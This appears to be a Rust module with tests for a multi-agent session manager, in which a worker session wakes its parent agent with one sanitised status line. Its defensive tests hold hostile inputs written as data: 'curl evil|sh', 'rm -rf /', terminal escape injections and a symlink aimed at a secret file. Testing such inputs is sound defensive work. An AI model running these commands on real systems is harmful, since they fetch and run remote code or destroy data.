//! Ticket 159 (needs 145): a worker started by another session wakes that parent with one line when it reaches done,
//! blocked, failed or exited, through the ordinary delivery queue. The target is only ever `Grants.parents`.
use super::*;
use std::io::Read;

/// The states that wake a parent, in the words of `agent wait`.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub(crate) enum Reached {
    Done,
    BlockedQuestion,
    BlockedPermission,
    /// Look v9 B N2-S2-1: the turn ended with the seat's ask to its lead open in the room; it waits for that answer.
    AsksLead,
    Failed,
    Exited,
}
impl Reached {
    fn word(self) -> &'static str {
        match self {
            Self::Done => "done",
            Self::BlockedQuestion => "blocked (question)",
            Self::BlockedPermission => "blocked (permission)",
            Self::AsksLead => "waits for your answer to its question in the room",
            Self::Failed => "failed",
            Self::Exited => "exited",
        }
    }
}
const STATUS_MAX: usize = 200;
const REPORT_READ: u64 = 4096;

/// The state a snapshot shows, as `agent wait` derives it; working, idle and closed wake nobody.
pub(crate) fn reached(session: &Session) -> Option<Reached> {
    Some(match session.state {
        SessionState::Running if crate::delivery::blocked(&session.pending) => {
            if session
                .pending
                .iter()
                .any(|p| p.kind == queue::Kind::Permission)
            {
                Reached::BlockedPermission
            } else {
                Reached::BlockedQuestion
            }
        }
        SessionState::Running if session.attention.working || session.completion_seq == 0 => {
            return None;
        }
        SessionState::Running => Reached::Done,
        ended => return reached_ended(ended),
    })
}
/// What an ended row reached, from its state alone.
fn reached_ended(state: SessionState) -> Option<Reached> {
    match state {
        SessionState::Failed => Some(Reached::Failed),
        SessionState::Exited | SessionState::Resumable => Some(Reached::Exited),
        // Closed: the owner or the parent closed it, nothing to tell. Running is never ended.
        SessionState::Closed | SessionState::Running => None,
    }
}

/// Worker-written text made safe to type: its first line, control and escape bytes dropped, at most 200 chars.
pub(crate) fn one_line(text: &str) -> String {
    let line = text.split(['\n', '\r']).next().unwrap_or_default();
    // Hidden characters too: they reorder or hide what the parent reads.
    let clean: String = line
        .chars()
        .filter(|c| !c.is_control() && !crate::board::rights::hidden(*c))
        .collect();
    clean.trim().chars().take(STATUS_MAX).collect()
}

/// The `STATUS:` first line of `REPORT.md` in the worker's own folder, when the file was written at or after `since`
/// (ms); a symlink is never followed.
pub(crate) fn report_status(folder: &Path, since: u64) -> Option<String> {
    use std::os::unix::fs::OpenOptionsExt;
    let file = fs::OpenOptions::new()
        .read(true)
        .custom_flags(libc::O_NOFOLLOW | libc::O_NONBLOCK)
        .open(folder.join("REPORT.md"))
        .ok()?;
    let meta = file.metadata().ok()?;
    if !meta.is_file() {
        return None; // a FIFO or device would block or never end
    }
    // Ticket 1054: a report an earlier turn wrote was told then; this turn's end does not say it again.
    let written = meta
        .modified()
        .ok()?
        .duration_since(std::time::UNIX_EPOCH)
        .ok()?;
    if (written.as_millis() as u64) < since {
        return None;
    }
    let mut head = Vec::new();
    file.take(REPORT_READ).read_to_end(&mut head).ok()?;
    let line = one_line(&String::from_utf8_lossy(&head));
    line.starts_with("STATUS:").then_some(line)
}

/// The worker's text is quoted and labelled, so an agent parent reads it as data, not as its own instruction.
pub(crate) fn line(label: &str, id: &str, reached: Reached, status: Option<&str>) -> String {
    let name = one_line(label);
    let name = if name.is_empty() { id } else { &name };
    // Ticket 1054: a turn end with no new report is not "done"; the line still goes, so a lead hears a standing seat.
    let word = match (reached, status) {
        (Reached::Done, None) => "ended a turn (no report yet)",
        _ => reached.word(),
    };
    let mut line = format!("worker {name} {word}");
    if let Some(status) = status {
        line.push_str(&format!("; report says: \"{}\"", status.replace('"', "'")));
    }
    line
}

impl Sessions {
    /// Ticket 990: the parent links of the stored records, read when the core opens (the grants map is memory only, so
    /// a lead stopped hearing the workers it had started before a restart). The state each worker is in now counts as
    /// told: a restart must not send every finished worker's line again.
    /// shortcut: a state reached while no core ran is not told, a persisted `wakes` map would cover it.
    pub(crate) fn restore_parents(&mut self) {
        let links: Vec<(String, String)> = self
            .entries
            .values()
            .filter_map(|e| Some((e.meta.id.clone(), e.meta.parent.clone()?)))
            .filter(|(_, parent)| self.entries.contains_key(parent))
            .collect();
        for (child, parent) in links {
            let snapshot = self.snapshot_session(&self.entries[&child].meta);
            if let Some(reached) = reached(&snapshot) {
                self.wakes
                    .entry(child.clone())
                    .or_default()
                    .insert((reached, snapshot.completion_seq));
            }
            self.grants.parents.insert(child, parent);
        }
    }
    /// Ticket 159: one wake per state reached per turn of each worker with a recorded parent. A wake that cannot go
    /// (parent gone, outside the worker's grants, refused after a possible write) is dropped, never redirected; one
    /// refused before anything was written (parent blocked, screen behind) is tried again next tick.
    pub(crate) fn wake_parents(&mut self) {
        let entries = &self.entries;
        self.wakes.retain(|id, _| entries.contains_key(id));
        let mut due = Vec::new();
        for (child, parent) in &self.grants.parents {
            let Some(entry) = self.entries.get(child) else {
                continue;
            };
            // Idle CPU: an ended row's state alone says what it reached (`reached`), so only a running one is built
            // into a snapshot; this tick runs four times a second over every worker ever started.
            let (mut reached, seq, working_since) = if entry.meta.state == SessionState::Running {
                let snapshot = self.snapshot_session(&entry.meta);
                let Some(reached) = reached(&snapshot) else {
                    continue;
                };
                let since = snapshot.attention.working_since;
                (reached, snapshot.completion_seq, since)
            } else {
                let Some(reached) = reached_ended(entry.meta.state) else {
                    continue;
                };
                (reached, self.queue.attention(child).completion_seq, 0)
            };
            let told = |r: Reached| self.wakes.get(child).is_some_and(|s| s.contains(&(r, seq)));
            if reached == Reached::Done {
                // A turn told as waiting for the lead is not told "done" once the answer comes: the seat starts a turn.
                if told(Reached::AsksLead) {
                    continue;
                }
                if !told(Reached::Done) && self.asks_lead(child, parent) {
                    reached = Reached::AsksLead;
                }
            }
            let key = (reached, seq);
            let sent = self.wakes.entry(child.clone()).or_default();
            sent.retain(|(_, seq)| *seq == key.1); // only this turn's keys are kept
            if sent.contains(&key) {
                continue;
            }
            // Look 11-17 v4 Home N7: a teammate seat's first turn answers its brief ("ready"); the lead that opened it
            // already knows. Only the turns of its job are told, so one finish is one line.
            // A brief that carries a scheduled task is that job: it is told.
            let job = entry
                .meta
                .send_log
                .iter()
                .chain(&entry.meta.send_queue)
                .any(|s| s.content.contains("## Scheduled task"));
            if reached == Reached::Done && seq == 1 && entry.meta.teammate.is_some() && !job {
                sent.insert(key);
                continue;
            }
            let since = match reached {
                Reached::Done => working_since,
                _ => 0,
            };
            let status = report_status(&entry.meta.cwd, since);
            due.push((
                child.clone(),
                parent.clone(),
                entry.meta.project.clone(),
                key,
                line(&entry.meta.label, child, reached, status.as_deref()),
            ));
        }
        for (child, parent, project, key, text) in due {
            let caller = crate::grants::Caller {
                id: child.clone(),
                project,
            };
            // Agent parents only: a shell would run the worker's text as a command. `send` itself refuses a parent
            // that is not running.
            let deliverable = self.entries.get(&parent).is_some_and(|p| {
                matches!(
                    p.meta.kind,
                    AgentKind::Claude | AgentKind::Codex | AgentKind::Acp
                ) && self.grants.owns(&caller, &p.meta)
            });
            // A parent whose input box was edited by hand takes no line (`send_line` queues it): the room says so
            // at once, so the user sees why the lead does not move.
            let waits = self.box_edited(&parent) && !self.entries[&parent].observer.clear_box;
            // The core types this line for the worker: the room keeps it as the core's (ticket 990).
            let retry = deliverable
                && match self.send_line(&child, &parent, text.clone()) {
                    Ok(reply) => {
                        let row = match &reply {
                            Reply::Delivery { send } => Some(send.id.clone()),
                            _ => None,
                        };
                        if let Reply::Delivery { send } = reply
                            && send.status == "queued"
                        {
                            // Ticket 1056: one queued wake line per worker; the newer one replaces the older.
                            let older: Vec<String> = self.entries[&parent]
                                .meta
                                .send_queue
                                .iter()
                                .filter(|s| {
                                    s.sender == child
                                        && s.status == "queued"
                                        && self.wake_rows.contains(&s.id)
                                })
                                .map(|s| s.id.clone())
                                .collect();
                            for old in older {
                                if let Err(e) = self.finish_send(&parent, &old, "canceled") {
                                    eprintln!("older wake line {old} not dropped: {e}");
                                }
                            }
                            self.wake_rows.insert(send.id);
                        }
                        let said = if waits {
                            format!(
                                "{text} (waits: the input box of {} was edited by hand; it goes in after the next \
                                 message sent there)",
                                one_line(&self.entries[&parent].meta.label)
                            )
                        } else {
                            text
                        };
                        self.typed(&child, &parent, &said, crate::room::By::Core, row);
                        false
                    }
                    Err(e) => e == "agent_blocked" || e == "screen not current, try again",
                };
            if !retry {
                self.check_in(&child, key.0);
                self.wakes.entry(child).or_default().insert(key);
            }
        }
    }
    /// Ticket 1056: a queued wake line no longer worth telling: its worker was closed, or the task it sits on is closed.
    pub(crate) fn wake_gone(&self, worker: &str) -> bool {
        if self
            .entries
            .get(worker)
            .is_none_or(|e| e.meta.state == SessionState::Closed)
        {
            return true;
        }
        let ledger = crate::ledger::Ledger::open(&self.home);
        ledger.of_seat(worker).is_none()
            && ledger.list().is_ok_and(|tasks| {
                tasks
                    .iter()
                    .any(|t| t.closed.is_some() && t.seats.iter().any(|s| s.session == worker))
            })
    }
    /// Ticket 1004: a turn end told to the lead (done, or failed) is one check-in of the task the worker is a seat
    /// of. A seat that waits (a question, a permission, its lead's answer) is none: its card or ask says who it waits
    /// for. Judged off this lock (`Sessions::start_judge`).
    fn check_in(&mut self, seat: &str, reached: Reached) {
        if !matches!(reached, Reached::Done | Reached::Failed) {
            return;
        }
        let Some(entry) = self.entries.get(seat) else {
            return;
        };
        let Some(task) = crate::ledger::Ledger::open(&self.home).of_seat(seat) else {
            return;
        };
        // The core's own line for a failed session (problems.rs), never what the agent printed while it ran.
        let error = (reached == Reached::Failed).then(|| {
            let cause = entry.meta.problem.as_ref().map(|p| one_line(&p.cause));
            cause.filter(|c| !c.is_empty()).unwrap_or("failed".into())
        });
        let name = one_line(&entry.meta.label);
        self.check_in_due(crate::ledger::CheckIn {
            task,
            session: seat.into(),
            name,
            error,
        });
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn scratch(name: &str) -> PathBuf {
        let home = std::env::temp_dir().join(format!("ns-wk-{name}-{}-0", std::process::id()));
        let _ = fs::remove_dir_all(&home);
        fs::create_dir_all(&home).unwrap();
        fs::canonicalize(home).unwrap()
    }
    /// A core with shell sessions that idle until the test ends; the parent's typed bytes are its send rows.
    struct Fix {
        core: Sessions,
        home: PathBuf,
    }
    impl Drop for Fix {
        fn drop(&mut self) {
            let _ = fs::write(self.home.join("stop"), "");
            let _ = self.core.handle(Request::Stop);
            let _ = fs::remove_dir_all(&self.home);
        }
    }
    impl Fix {
        fn new(name: &str) -> Self {
            let home = scratch(name);
            let script = home.join("idle.sh");
            fs::write(
                &script,
                "#!/bin/sh\nstty raw -echo\ni=0; while [ ! -f stop ] && [ $i -lt 2400 ]; do sleep 0.05; i=$((i+1)); done\n",
            )
            .unwrap();
            fs::set_permissions(&script, std::os::unix::fs::PermissionsExt::from_mode(0o700))
                .unwrap();
            Self {
                core: Sessions::open(&home).unwrap(),
                home,
            }
        }
        fn session(&mut self, label: &str, folder: &Path) -> String {
            fs::create_dir_all(folder).unwrap();
            let mut launch = self
                .core
                .launch(StartSession {
                    account: None,
                    kind: AgentKind::Shell,
                    project: folder.into(),
                    worktree: false,
                    label: label.into(),
                    args: vec![self.home.join("idle.sh").to_str().unwrap().into()],
                    model: None,
                    effort: None,
                    resume: None,
                })
                .prepare()
                .unwrap();
            let id = self.core.start(&launch).unwrap().id;
            launch.committed = true;
            id
        }
        /// A parent (`coord`) and a worker (`w1`) it started, in its own folder.
        fn pair(name: &str) -> (Self, String, String) {
            let mut f = Self::new(name);
            let parent = f.session("coord", &f.home.clone());
            // An agent parent (the process is a shell script; only the kind decides delivery).
            f.core.entries.get_mut(&parent).unwrap().meta.kind = AgentKind::Claude;
            let child = f.session("w1", &f.home.join("w1"));
            f.core.grants.parents.insert(child.clone(), parent.clone());
            (f, parent, child)
        }
        fn finish_turn(&mut self, id: &str) {
            self.core.queue.acp_turn(id, true).unwrap();
            self.core.queue.acp_turn(id, false).unwrap();
        }
        /// A turn of `w1` that writes its REPORT.md while it works.
        fn report_turn(&mut self, id: &str, report: &str) {
            self.core.queue.acp_turn(id, true).unwrap();
            fs::write(self.home.join("w1/REPORT.md"), report).unwrap();
            self.core.queue.acp_turn(id, false).unwrap();
        }
        fn wakes(&self, id: &str) -> Vec<String> {
            let meta = &self.core.entries[id].meta;
            meta.send_log
                .iter()
                .chain(&meta.send_queue)
                .filter(|s| s.content.starts_with("worker "))
                .map(|s| s.content.clone())
                .collect()
        }
    }

    /// Ticket 990: after a core restart the grants map is empty; the stored parent brings the link back, the state
    /// the worker is in then is not told again, and the next state it reaches is.
    #[test]
    fn stored_parent_wakes_again_after_a_restart() {
        let (mut f, parent, child) = Fix::pair("restore");
        f.core.entries.get_mut(&child).unwrap().meta.parent = Some(parent.clone());
        f.finish_turn(&child);
        f.core.wake_parents();
        assert_eq!(f.wakes(&parent).len(), 1, "{:?}", f.wakes(&parent));
        // What a restart leaves: no grants, no record of what was told.
        f.core.grants.parents.clear();
        f.core.wakes.clear();
        f.core.wake_parents();
        assert_eq!(f.wakes(&parent).len(), 1, "no link, no wake");
        f.core.restore_parents();
        f.core.wake_parents();
        assert_eq!(
            f.wakes(&parent).len(),
            1,
            "the finished turn is not told twice"
        );
        f.finish_turn(&child);
        f.core.wake_parents();
        assert_eq!(f.wakes(&parent).len(), 2, "{:?}", f.wakes(&parent));
    }
    /// Ticket 990 slice g (recovery experiment): the lead's conversation ended and a new seat of the same teammate
    /// opened. The worker the old seat started answers to the new one: its next finished turn wakes the new seat.
    #[test]
    fn a_leads_new_seat_hears_the_workers_its_earlier_seat_started() {
        let (mut f, old, child) = Fix::pair("adopt");
        f.core.entries.get_mut(&old).unwrap().meta.teammate = Some("lead-1".into());
        f.core.entries.get_mut(&child).unwrap().meta.parent = Some(old.clone());
        // Another teammate's worker stays where it is.
        let other = f.session("coord-2", &f.home.clone());
        f.core.entries.get_mut(&other).unwrap().meta.teammate = Some("lead-2".into());
        let theirs = f.session("w2", &f.home.join("w2"));
        f.core.entries.get_mut(&theirs).unwrap().meta.parent = Some(other.clone());
        f.core.grants.parents.insert(theirs.clone(), other.clone());
        // The old conversation ends; the new seat opens.
        f.core.handle(Request::Close { id: old.clone() }).unwrap();
        let new = f.session("coord", &f.home.clone());
        f.core.entries.get_mut(&new).unwrap().meta.kind = AgentKind::Claude;
        f.core.seat_session(&new, "lead-1", None).unwrap();
        assert_eq!(
            f.core.entries[&child].meta.parent.as_deref(),
            Some(new.as_str())
        );
        assert_eq!(
            f.core.entries[&theirs].meta.parent.as_deref(),
            Some(other.as_str())
        );
        f.finish_turn(&child);
        f.core.wake_parents();
        assert_eq!(f.wakes(&new).len(), 1, "{:?}", f.wakes(&new));
    }
    /// Look 11-17 v4 Home N7: a teammate seat's brief turn ("ready") wakes nobody; its job's turn does, once.
    #[test]
    fn a_teammates_brief_turn_wakes_nobody() {
        let (mut f, parent, child) = Fix::pair("brief-turn");
        f.core.entries.get_mut(&child).unwrap().meta.teammate = Some("counter".into());
        f.finish_turn(&child);
        f.core.wake_parents();
        assert!(f.wakes(&parent).is_empty(), "{:?}", f.wakes(&parent));
        f.finish_turn(&child);
        f.core.wake_parents();
        f.core.wake_parents();
        assert_eq!(f.wakes(&parent), ["worker w1 ended a turn (no report yet)"]);
    }
    #[test]
    fn wake_on_done() {
        let (mut f, parent, child) = Fix::pair("done");
        f.core.wake_parents();
        assert!(f.wakes(&parent).is_empty(), "an idle worker wakes nobody");
        // Ticket 1054: a turn end with no report says so, once, and never "done".
        let ended = "worker w1 ended a turn (no report yet)";
        f.finish_turn(&child);
        f.core.tick().unwrap(); // the core's own tick sends it
        f.core.wake_parents();
        assert_eq!(f.wakes(&parent), [ended]);
        f.report_turn(&child, "STATUS: done\nROUND: 1\n");
        f.core.wake_parents();
        let done = "worker w1 done; report says: \"STATUS: done\"";
        assert_eq!(f.wakes(&parent), [ended, done]);
        // A later turn that leaves the told report as it was is no second "done".
        f.finish_turn(&child);
        f.core.wake_parents();
        assert_eq!(f.wakes(&parent), [ended, done, ended]);
        let meta = &f.core.entries[&parent].meta;
        let row = meta.send_log.iter().chain(&meta.send_queue).next().unwrap();
        assert_eq!((row.sender.as_str(), row.submit), (child.as_str(), true));
        assert!(f.wakes(&child).is_empty());
    }
    #[test]
    fn wake_on_blocked_question() {
        let (mut f, parent, child) = Fix::pair("question");
        f.core
            .queue
            .acp_ask(&child, queue::Kind::Question, "which?".into())
            .unwrap();
        f.core.wake_parents();
        assert_eq!(f.wakes(&parent), ["worker w1 blocked (question)"]);
    }
    /// Look v9 B N2-S2-1: a worker whose question went to its lead as a room ask ends its turn waiting, not done; the
    /// answer does not turn that turn into "done", the next turn is told as usual.
    #[test]
    fn a_turn_with_an_open_ask_to_the_lead_is_not_done() {
        use crate::room::{By, Draft, Kind, Log};
        let (mut f, parent, child) = Fix::pair("asks-lead");
        f.core.entries.get_mut(&child).unwrap().meta.parent = Some(parent.clone());
        let log = Log::open(&f.core.home, &f.core.room_project(&child).unwrap());
        let draft = |kind, from: &str, to: &str, reply_to| Draft {
            kind,
            from: from.into(),
            to: to.into(),
            thread: Some(format!("q-{child}")),
            reply_to,
            body: "one or two?".into(),
            created_by: By::Agent,
            peers: false,
        };
        let ask = log.add(draft(Kind::Ask, &child, &parent, None)).unwrap();
        f.finish_turn(&child);
        f.core.wake_parents();
        let waits = "worker w1 waits for your answer to its question in the room";
        assert_eq!(f.wakes(&parent), [waits]);
        log.add(draft(Kind::Reply, &parent, &child, Some(ask.id)))
            .unwrap();
        f.core.wake_parents();
        assert_eq!(
            f.wakes(&parent),
            [waits],
            "the answered turn is not told done"
        );
        f.finish_turn(&child);
        f.core.wake_parents();
        assert_eq!(
            f.wakes(&parent),
            [waits, "worker w1 ended a turn (no report yet)"]
        );
    }
    #[test]
    fn wake_on_blocked_permission() {
        let (mut f, parent, child) = Fix::pair("perm");
        f.core
            .queue
            .acp_ask(&child, queue::Kind::Permission, "run rm".into())
            .unwrap();
        f.core.wake_parents();
        assert_eq!(f.wakes(&parent), ["worker w1 blocked (permission)"]);
    }
    #[test]
    fn wake_on_failed_or_exited() {
        let (mut f, parent, child) = Fix::pair("ended");
        let w2 = f.session("w2", &f.home.join("w2"));
        f.core.grants.parents.insert(w2.clone(), parent.clone());
        f.core.entries.get_mut(&child).unwrap().meta.state = SessionState::Failed;
        f.core.entries.get_mut(&w2).unwrap().meta.state = SessionState::Exited;
        f.core.wake_parents();
        f.core.wake_parents();
        let mut got = f.wakes(&parent);
        got.sort();
        assert_eq!(got, ["worker w1 failed", "worker w2 exited"]);
    }
    #[test]
    fn wake_waits_for_idle_parent() {
        let (mut f, parent, child) = Fix::pair("busy");
        // A parent agent in a turn: the existing queue rule holds the line.
        f.core.queue.acp_turn(&parent, true).unwrap();
        f.finish_turn(&child);
        f.core.wake_parents();
        let queue = &f.core.entries[&parent].meta.send_queue;
        assert_eq!(queue.len(), 1);
        assert_eq!(queue[0].status, "queued");
        assert_eq!(queue[0].content, "worker w1 ended a turn (no report yet)");
        f.core.queue.acp_turn(&parent, false).unwrap();
        f.core.flush_delivery().unwrap();
        let row = f.core.entries[&parent]
            .meta
            .send_log
            .iter()
            .chain(&f.core.entries[&parent].meta.send_queue)
            .find(|s| s.content == "worker w1 ended a turn (no report yet)")
            .cloned()
            .unwrap();
        assert_ne!(row.status, "queued", "delivered once the parent is ready");
        f.core.wake_parents();
        assert_eq!(f.wakes(&parent).len(), 1, "never queued twice");
    }
    /// Look 11-17 v6r B6-S2-1: the lead's terminal was shown for a question the user then answered on its card. The
    /// terminal's focus reports had marked the lead's input box as edited by hand, so every worker's finish line was
    /// refused and dropped, and the lead sat idle until the user wrote to it.
    #[test]
    fn a_terminal_report_does_not_stop_a_leads_wake() {
        let (mut f, parent, child) = Fix::pair("report");
        f.finish_turn(&parent);
        // Seventh look: and the terminal's answers to Claude's own questions at its start (its name, a mode, a colour).
        for report in [
            "\x1b[I",
            "\x1b[O",
            "\x1b[<0;10;5M",
            "\x1bP>|xterm.js(5.5.0)\x1b\\",
            "\x1b[?2031;2$y",
            "\x1b[>0;276;0c",
            "\x1b]11;rgb:ffff/ffff/ffff\x1b\\",
        ] {
            f.core
                .handle(Request::SendText {
                    id: parent.clone(),
                    text: report.into(),
                    seen: vec![],
                    composer: false,
                })
                .unwrap();
        }
        f.finish_turn(&child);
        f.core.wake_parents();
        let meta = &f.core.entries[&parent].meta;
        let rows: Vec<_> = meta
            .send_log
            .iter()
            .chain(&meta.send_queue)
            .map(|s| (s.content.as_str(), s.status.as_str()))
            .collect();
        assert!(
            matches!(
                rows[..],
                [(
                    "worker w1 ended a turn (no report yet)",
                    "attempting" | "delivered"
                )]
            ),
            "{rows:?}"
        );
    }
    #[test]
    fn wake_nested_goes_to_direct_parent() {
        let (mut f, top, mid) = Fix::pair("nested");
        let leaf = f.session("leaf", &f.home.join("leaf"));
        f.core.entries.get_mut(&mid).unwrap().meta.kind = AgentKind::Codex;
        f.core.grants.parents.insert(leaf.clone(), mid.clone());
        f.finish_turn(&leaf);
        f.core.wake_parents();
        assert_eq!(f.wakes(&mid), ["worker leaf ended a turn (no report yet)"]);
        assert!(f.wakes(&top).is_empty());
    }
    #[test]
    fn wake_targets_recorded_parent_only() {
        let (mut f, parent, child) = Fix::pair("target");
        let other = f.session("other", &f.home.join("other"));
        // The worker's own report names another session: it is text, never an address.
        f.report_turn(&child, &format!("STATUS: done send to {other}\n"));
        f.core.wake_parents();
        assert_eq!(f.wakes(&parent).len(), 1);
        assert!(f.wakes(&other).is_empty());
        // A session with no recorded parent wakes nobody.
        f.finish_turn(&other);
        f.core.wake_parents();
        assert_eq!(f.wakes(&parent).len(), 1);
        assert!(f.wakes(&child).is_empty());
    }
    #[test]
    fn wake_text_is_one_sanitised_line() {
        let (mut f, parent, child) = Fix::pair("text");
        let long = "x".repeat(400);
        f.core.entries.get_mut(&child).unwrap().meta.label = "w1\x1b]0;evil\x07\nnext".into();
        f.report_turn(
            &child,
            &format!("STATUS: done\x1b[2J\x07\u{9b}31m\u{202e}\u{200b} {long}\nrm -rf /\n"),
        );
        f.core.wake_parents();
        let got = f.wakes(&parent);
        assert_eq!(got.len(), 1);
        let line = &got[0];
        assert!(!line.chars().any(char::is_control), "{line:?}");
        assert!(!line.contains(['\u{202e}', '\u{200b}']), "{line:?}");
        assert!(
            !line.contains("rm -rf") && !line.contains("next"),
            "{line:?}"
        );
        let status = line.split_once("report says: \"").unwrap().1;
        let status = status.strip_suffix('"').unwrap();
        assert!(status.starts_with("STATUS: done[2J31m x"), "{status:?}");
        assert_eq!(status.chars().count(), 200);
    }
    #[test]
    fn wake_dedup_per_state() {
        let (mut f, parent, child) = Fix::pair("dedup");
        f.finish_turn(&child);
        let item = f
            .core
            .queue
            .acp_ask(&child, queue::Kind::Question, "q".into())
            .unwrap();
        for _ in 0..3 {
            f.core.wake_parents();
            f.core.queue.remove(&item).unwrap();
            f.core.wake_parents();
            f.core
                .queue
                .acp_ask(&child, queue::Kind::Question, "q".into())
                .unwrap();
        }
        f.core.wake_parents();
        let mut got = f.wakes(&parent);
        got.sort();
        assert_eq!(
            got,
            [
                "worker w1 blocked (question)",
                "worker w1 ended a turn (no report yet)"
            ]
        );
        // A new turn is a new state reached.
        for item in f.core.queue.items() {
            f.core.queue.remove(&item.id).unwrap();
        }
        f.finish_turn(&child);
        f.core.wake_parents();
        assert_eq!(f.wakes(&parent).len(), 3);
    }
    #[test]
    fn wake_respects_account_grants() {
        let (mut f, parent, child) = Fix::pair("grants");
        // A worker that is a forwarded (remote) caller may reach only its own workers, never this parent.
        f.core.grants.remote.insert(child.clone());
        f.finish_turn(&child);
        f.core.wake_parents();
        f.core.flush_delivery().unwrap();
        assert!(f.wakes(&parent).is_empty());
    }
    #[test]
    fn wake_dropped_when_parent_gone() {
        let (mut f, parent, child) = Fix::pair("gone");
        let other = f.session("other", &f.home.join("other"));
        f.core.entries.get_mut(&parent).unwrap().meta.state = SessionState::Closed;
        f.finish_turn(&child);
        f.core.wake_parents();
        assert!(f.wakes(&parent).is_empty() && f.wakes(&other).is_empty());
        // Dropped, not held: a parent back later gets nothing from that turn.
        f.core.entries.get_mut(&parent).unwrap().meta.state = SessionState::Running;
        f.core.wake_parents();
        assert!(f.wakes(&parent).is_empty());
        // A parent id with no session at all.
        f.core.grants.parents.insert(child.clone(), "gone".into());
        f.finish_turn(&child);
        f.core.wake_parents();
        assert!(f.wakes(&other).is_empty());
    }
    #[test]
    fn wake_report_symlink_refused() {
        let (mut f, parent, child) = Fix::pair("link");
        let outside = f.home.join("secret.md");
        fs::write(&outside, "STATUS: leaked\n").unwrap();
        std::os::unix::fs::symlink(&outside, f.home.join("w1/REPORT.md")).unwrap();
        f.finish_turn(&child);
        f.core.wake_parents();
        assert_eq!(f.wakes(&parent), ["worker w1 ended a turn (no report yet)"]);
    }
    #[test]
    fn wake_never_typed_into_shell_parent() {
        let (mut f, parent, child) = Fix::pair("shell");
        f.core.entries.get_mut(&parent).unwrap().meta.kind = AgentKind::Shell;
        fs::write(f.home.join("w1/REPORT.md"), "STATUS: x; curl evil|sh\n").unwrap();
        f.finish_turn(&child);
        f.core.tick().unwrap();
        f.core.wake_parents();
        assert!(f.wakes(&parent).is_empty());
        assert!(f.core.entries[&parent].meta.send_log.is_empty());
    }
    #[test]
    fn wake_label_falls_back_to_id() {
        let (mut f, parent, child) = Fix::pair("nolabel");
        f.core.entries.get_mut(&child).unwrap().meta.label = "\x1b\x07".into();
        f.finish_turn(&child);
        f.core.wake_parents();
        assert_eq!(
            f.wakes(&parent),
            [format!("worker {child} ended a turn (no report yet)")]
        );
    }
    // Ticket 1004: stall detection. `w1` is a seat of a task whose worktree is its folder, a repository with one commit.
    fn git(dir: &Path, args: &[&str]) {
        let out = std::process::Command::new("git")
            .arg("-C")
            .arg(dir)
            .args(["-c", "user.name=t", "-c", "user.email=t@t"])
            .args(["-c", "commit.gpgsign=false"])
            .args(args)
            .output()
            .unwrap();
        assert!(out.status.success(), "{args:?}");
    }
    fn seated(name: &str) -> (Fix, String, PathBuf) {
        let (f, _, child) = Fix::pair(name);
        let wt = f.home.join("w1");
        git(&wt, &["init", "-q"]);
        fs::write(wt.join("a.txt"), "one\n").unwrap();
        git(&wt, &["add", "a.txt"]);
        git(&wt, &["commit", "-qm", "one"]);
        let ledger = crate::ledger::Ledger::open(&f.home);
        ledger
            .worktree_made(&f.home, "lead", &wt, "tax", 1)
            .unwrap();
        ledger.seat(&wt, &child, "w1", 1, &|_| true).unwrap();
        (f, child, wt)
    }
    impl Fix {
        /// The seat's turn ends and its lead is told; then what the server's loop does with the tick's check-ins.
        fn check_in(&mut self, seat: &str) {
            self.finish_turn(seat);
            self.judge();
        }
        fn judge(&mut self) {
            self.core.wake_parents();
            for c in std::mem::take(&mut self.core.check_ins) {
                if let Some(stalled) = c.stalled(&self.home) {
                    self.core.stall_card(&c, stalled);
                }
            }
        }
        fn stall_cards(&self) -> Vec<queue::Decision> {
            let all = self.core.queue.owner_items().into_iter();
            all.filter(|i| matches!(i.owner, Some(queue::OwnerAsk::Stall { .. })))
                .collect()
        }
    }
    #[test]
    fn two_quiet_check_ins_make_one_card() {
        let (mut f, child, _) = seated("quiet");
        f.check_in(&child); // the first check-in is what the next ones are compared with
        f.check_in(&child);
        assert!(f.stall_cards().is_empty(), "one quiet check-in is no stall");
        f.check_in(&child);
        let cards = f.stall_cards();
        assert_eq!(cards.len(), 1);
        assert_eq!(cards[0].session_id, child);
        assert_eq!(
            cards[0].owner,
            Some(queue::OwnerAsk::Stall {
                task: "t1".into(),
                title: "tax".into(),
                place: f.home.clone(),
                seat: "w1".into(),
                error: None,
            })
        );
        // The card counts on its project's row of the Home digest.
        let (_, facts) = f.core.digest_facts();
        assert_eq!(facts[&f.home].pending.len(), 1);
        // More quiet check-ins: the same card.
        f.check_in(&child);
        assert_eq!(f.stall_cards(), cards);
        // One card per stall: dismissed, it stays away while nothing moves.
        f.core.queue.answer_owner(|i| i.id == cards[0].id).unwrap();
        f.check_in(&child);
        assert!(f.stall_cards().is_empty());
        // A seat that waits for an answer is no check-in, and a check-in never reads as progress in the ledger.
        let task = crate::ledger::Ledger::open(&f.home)
            .of_seat(&child)
            .unwrap();
        assert_eq!(task.updated, 1);
        assert_eq!(task.stall.unwrap().quiet, 4);
    }
    #[test]
    fn the_same_error_three_times_makes_one_card() {
        let (mut f, child, wt) = seated("error");
        let parent = f.core.grants.parents[&child].clone();
        let ledger = crate::ledger::Ledger::open(&f.home);
        // A new seat of the task fails. A new seat is a change of the task's record, so no check-in here is quiet.
        let mut n = 1;
        let mut fail = |f: &mut Fix, cause: &str| {
            n += 1;
            let id = f.session(&format!("w{n}"), &wt);
            f.core.grants.parents.insert(id.clone(), parent.clone());
            ledger
                .seat_on("t1", &id, &format!("w{n}"), None, n, &|_| false)
                .unwrap();
            let meta = &mut f.core.entries.get_mut(&id).unwrap().meta;
            meta.state = SessionState::Failed;
            meta.problem = Some(crate::problems::Problem {
                case: crate::problems::Case::LoggedOut,
                cause: cause.into(),
                reset: None,
                details: String::new(),
            });
            f.judge();
            id
        };
        fail(&mut f, "Claude is not signed in");
        fail(&mut f, "Claude is not signed in");
        assert!(f.stall_cards().is_empty(), "twice is no stall");
        let third = fail(&mut f, "Claude is not signed in");
        let cards = f.stall_cards();
        assert_eq!(cards.len(), 1);
        assert_eq!(cards[0].session_id, third);
        assert!(matches!(
            &cards[0].owner,
            Some(queue::OwnerAsk::Stall { seat, error: Some(e), .. }) if seat == "w4" && e == "Claude is not signed in"
        ));
        assert!(
            cards[0]
                .text
                .contains("w4 stopped on: Claude is not signed in")
        );
        let stall = ledger.of_seat(&child).unwrap().stall.unwrap();
        assert_eq!((stall.quiet, stall.same), (0, 3));
        // A fourth time: still that one card. Another error is not the same error: the card goes.
